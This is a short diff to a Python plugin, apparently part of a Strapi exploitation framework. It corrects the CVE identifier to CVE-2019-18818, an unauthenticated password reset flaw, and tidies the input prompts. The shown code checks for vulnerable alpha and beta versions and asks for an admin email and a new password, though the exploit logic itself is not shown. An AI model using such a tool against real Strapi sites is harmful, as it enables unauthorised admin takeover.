@@ -1,12 +1,12 @@
-'''CVE-2019-1881 exploit for Strapi. '''
+'''CVE-2019-18818 exploit for Strapi. '''
 from json import JSONDecodeError
 import requests
 from strapi_plugin import StrapiExploitInterface
 
-class CVE2019_1881(StrapiExploitInterface):
-    '''CVE-2019-1881 exploit for Strapi.'''
+class CVE2019_18818(StrapiExploitInterface):
+    '''CVE-2019-18818 exploit for Strapi.'''
     def __init__(self):
-        super().__init__("Strapi-CVE-2019-1881", "Unauthenticated Password Reset Vulnerability / Privilege Escalation")
+        super().__init__("Strapi-CVE-2019-18818", "Unauthenticated Password Reset Vulnerability / Privilege Escalation")
     def check_if_vulnerable(self, version: str) -> bool:
         '''Check if the Strapi instance is vulnerable.'''
         if version.startswith('3.0.0-beta') or version.startswith('3.0.0-alpha'):
@@ -37,10 +37,10 @@ class CVE2019_1881(StrapiExploitInterface):
         if not self.check_if_vulnerable(version):
             self.error("The Strapi instance is not vulnerable.")
             return True
-        email = self.input("[+] Admin email: ")
-        password = self.input("[+] Enter the new password: ")
+        email = self.input("Admin email: ")
+        password = self.input("Enter the new password: ")
         self.exploit(url, email, password)
 
 def init():
     '''Initialize the plugin.'''
-    return CVE2019_1881()
+    return CVE2019_18818()
